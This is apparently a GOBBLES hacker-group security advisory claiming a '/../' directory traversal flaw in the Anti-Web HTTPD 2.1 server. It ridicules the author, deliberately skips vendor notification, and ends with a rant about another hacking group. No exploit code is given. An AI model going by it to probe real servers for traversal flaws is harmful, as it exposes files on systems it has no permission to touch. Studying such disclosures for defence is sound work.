GOBBLES thanks many to dugsong for his kind words to GOBBLES and the
researchers at GOBBLES Labs concerning the death of our beloved mascot
Mr. Goldilocks the Goldfish.  Thanks dugsong from GOBBLES for your support
of us in our time of crisis!  This guy write great sniffer you can
download from http://www.monkey.org/~dugsong/dsniff/ which is DMCA
censored but still for download anyways which GOBBLES use sometimes to spy
on researchers at GOBBLES Labs cybersex conversations (j/k guys and
girl you all know that GOBBLES respect you privacy it just a joke hehehe).  
Check out dsniff though sometimes because GOBBLES think you will like it
on your penetration testing.  Good work on it dugsong from GOBBLES!

BACKGROUD
*********

OK here is what GOBBLES did.  Since GOBBLES researchers have already found
big security problems in two hyper text transfer protocol daemons GOBBLES
did decide "hey what the hell GOBBLES team go research all secure hyper
text transfer protocol daemons".  The first thing that a GOBBLES
researcher did do was go to freshmeat.net and search all projects for the
words 'secure httpd' and this is the first hit that they did receive:

   Version:

So GOBBLES did go and have it downloaded.  Here are some things said in
the README file from the tarball that GOBBLES did read concerning this
program:

...
This is the 2.1 updated version of Anti-Web. It has now been even more
hardened against buffer overflows and DoS attacks. (DoS attacks in
particular). It's simple design has been a boon towards it's security. See
the CHANGES file to see what exactly has changed.
...
After getting fed up with the bloated, complex nature of most of the
web servers out there (Apache, IIS, most everything), I decided, hell,
the HyperText Transfer Protocol isn't very complex at all! Why don't I
write a simple server that can be launched from the command line; no
configuration files required!

This is the result. A small, robust, secure, drool-proof, but still
quite flexible, web server.
...

Also tarball was only 37287 bytes so GOBBLES think that maybe the
programmer lived up to he word and that he make the server smart, small,
and secure like he like to say the server is.  Well, GOBBLES find out
things were different very soon, hehehehe. 

SECURITY HISTORY
****************

Well GOBBLES could not find any writeups of security problems on Anti-Web
Webserver on the online but in the tarball and its CHANGELOG there were
some points of concern from the history one of which is:

	0.9 -> 1.0
	~~~~~~~~~~
	-Stability patches galore.
	-Responds the HEAD requests.
	-Fixed a buffer overflow that cause a coredump.

But GOBBLES know this is version 2.1 that he is testing and not .9 so he
hope that programmer learn by now about silly programming errors.  GOBBLES
once again judged too quickly because GOBBLES did find things wrong with
this server.

VERSIONS AFFECTED
*****************

Well GOBBLES did only test 2.1 version of the server since it all that
were available for download on the website distribution page.  It is
assumed by GOBBLES that this bug is likely in earlier versions of the
server but this cannot be confirmed perhaps if you are interested in
finding out for sure you can email the author of Anti-Web Webserver at
doug@bearcountry.cjb.net and ask about if the bug GOBBLES did find is in
older versions too.  GOBBLES was also interested to find that the author
own webserver is not running this critically acclaimed secure webserver
that he right, does he no have faith in the bragged security of his
program or does he know something about its security that the public
should know?  GOBBLES is suspicious here about this. . .

GOBBLES think that by now you get the idea about what crap this secure 
webserver really are, especially when it own author will not run it on 
he system!

VENDOR NOTIFICATION STATUS
**************************

GOBBLES did instruct the team to not contact the programmer of this crap
webserver that say it secure because of following reasons.  First to show
a paste from README file included in distribution tarball.

...
Originally, I opted on the side of slack, and wrote AWHTTPD as a
forking web server, which turned out to be somewhat of a mistake. I
felt to constrained with the code of 1.0, that I sat down and did a
complete rewrite of it. Enter AWHTTPD 2.0: A single process webserver
that takes care of everything my own personal website needs, plus, I
can sleep at night knowing that my site won't be vulnerable to the latest
IIS security bug of the week.
...

GOBBLES see here this person making a mockery of the security of another
product and claiming that he product is superior to it but in reality he
have put an old bug in his own program that is similar to old IIS 3.0 bug.
At least with new versions of IIS the /../ kinds of directory traversal
bugs require elite trickery methods like unicode to walk around the 
filesystem.  GOBBLES does see no reason to take time out of he day to 
personally notify a vendor of a product that brag security and mock the
insecurity of other similar type products from other vendors when the old
type of IIS bug of the week he talk about is still in his own webserver
which seem a little stupid to GOBBLES.  If you have a problem with GOBBLES
not wanting to inform idiotic programmer about bug you can probably email
and yell at us for it but GOBBLES see nothing ethically wrong in this
instance due to the mocking tones in the README file about other products
insecurity.  Go get a clue doug.

EXPLOIT
*******

GOBBLES think no special exploit needed for this bug when Internet Explorer,
lynx, links, Netscape Navigator, Mozilla, Konquerer, and Opera exist which
all can easily exploit the bug without any hassle.  

SUGGESTED WORKAROUNDS
*********************

Well GOBBLES think that this product are complete crap and is the author is
an evil, evil man for claiming it security in such a fashion so the 
following recommendations is made about the product to the world.

1] Install a different webserver program probably any ones that the author
does mock in his README file like IIS and Apache are better choices than
this program.

2] That is GOBBLES only idea for this.

OH yeah GOBBLES have a beef to chew with members of Legions of the
Underworld at http://www.legions.org where they say on they webpage the
following:

    I ask the underground community to please think before you act.
    We will not condemn nor praise any attempt at cyberwarfare,
    but please understand, that the people you are trying to mess
    with are average people, and in America's view of freedom, it's
    acceptable for them to hate Americans. If you do upset the
    Taliban, or affiliated parties, remember that you are messing with
    a terrorist organization. Things could come back on you.  Please,
    think before you act.

GOBBLES do not specifically and exactly understand the why a group would
address the entire underground hacker community on a public website that 
isn't even with SSL support or a password to prevent the public from reading
it because should not the underground be underground and not on google.com
advertised webpages where the whole world can read it?  GOBBLES think that
this sort of thing is more of a press statement to the newspapers of the 
world (like cnn.com and newsbytes.com) rather than a real plea to we of the
underground.  GOBBLES seriously question the motives of this "Digital Ebola"
character and think that he should not be issuing statements publically to
the underground because then it is not really to the underground but to the
news media which is awful stupid to us.
